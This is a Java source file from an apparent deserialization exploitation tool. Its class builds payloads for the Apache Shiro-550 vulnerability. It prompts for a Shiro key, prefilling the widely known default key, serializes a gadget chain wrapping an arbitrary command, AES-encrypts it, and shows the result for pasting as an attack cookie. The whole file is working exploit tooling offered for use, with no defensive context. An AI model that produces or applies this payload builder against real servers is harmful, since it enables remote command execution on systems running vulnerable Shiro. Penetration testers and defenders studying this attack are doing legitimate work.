package org.zof.deswing.util;

import org.apache.shiro.codec.Base64;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import org.zof.deswing.ui.CopyableDialog;

import javax.swing.*;
import java.io.ByteArrayOutputStream;

public class ExportToShiro550 extends Export{
    @Override
    public void export(String type, String command) throws Exception {
        String keyText = JOptionPane.showInputDialog(
                "请输入Shiro密钥，如使用默认密钥，则直接点确定按钮，无需输入",
                "kPH+bIxk5D2deZiIxcaaaA==");
        if (keyText.isEmpty()) throw new RuntimeException("已取消");
        byte[] key = Base64.decode(CodecSupport.toBytes(keyText));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        exportToStream(type,command,bos);
        AesCipherService aes = new AesCipherService();
        ByteSource ciphertext = aes.encrypt(bos.toByteArray(), key);
        new CopyableDialog(
                "Shiro550导出Payload",
                ciphertext.toString()
        ).setVisible(true);
    }
}
